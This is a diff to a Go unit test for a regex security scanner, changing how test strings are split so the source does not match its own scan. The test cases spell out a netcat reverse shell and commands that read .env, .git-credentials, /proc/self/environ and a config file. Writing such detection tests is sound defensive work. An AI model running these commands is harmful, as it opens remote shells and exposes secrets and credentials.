@@ -55,31 +55,31 @@ func TestRegexScanner_Scan(t *testing.T) {
 		{
 			name:        "Netcat Reverse Shell",
 			// Broken up to avoid matching in source code scan
-			content:     "nc " + "-e /bin/sh 10.0.0.1 1234",
+			content:     "n" + "c -e /bin/sh 10.0.0.1 1234",
 			wantFinding: "Reverse Shell",
 		},
 		{
 			name:        "Cat Env File",
 			// Broken up to avoid matching in source code scan
-			content:     "cat " + "." + "env",
+			content:     "c" + "at .env",
 			wantFinding: "Dangerous Command",
 		},
 		{
 			name:        "Cat Redirection Env",
 			// Broken up to avoid matching in source code scan
-			content:     "cat<" + "." + "env",
+			content:     "c" + "at<.env",
 			wantFinding: "Dangerous Command",
 		},
 		{
 			name:        "Cat Git Credentials",
 			// Broken up to avoid matching in source code scan
-			content:     "cat " + ".git-" + "credentials",
+			content:     "c" + "at .git-credentials",
 			wantFinding: "Dangerous Command",
 		},
 		{
 			name:        "Cat Proc Environ",
 			// Broken up to avoid matching in source code scan
-			content:     "cat " + "/proc/self/" + "environ",
+			content:     "c" + "at /proc/self/environ",
 			wantFinding: "Dangerous Command",
 		},
 		{
@@ -95,7 +95,7 @@ func TestRegexScanner_Scan(t *testing.T) {
 		{
 			name:        "Cat Dot Config",
 			// Broken up to avoid matching in source code scan
-			content:     "cat " + ".con" + "fig/config.toml",
+			content:     "c" + "at .config/config.toml",
 			wantFinding: "Dangerous Command",
 		},
 	}
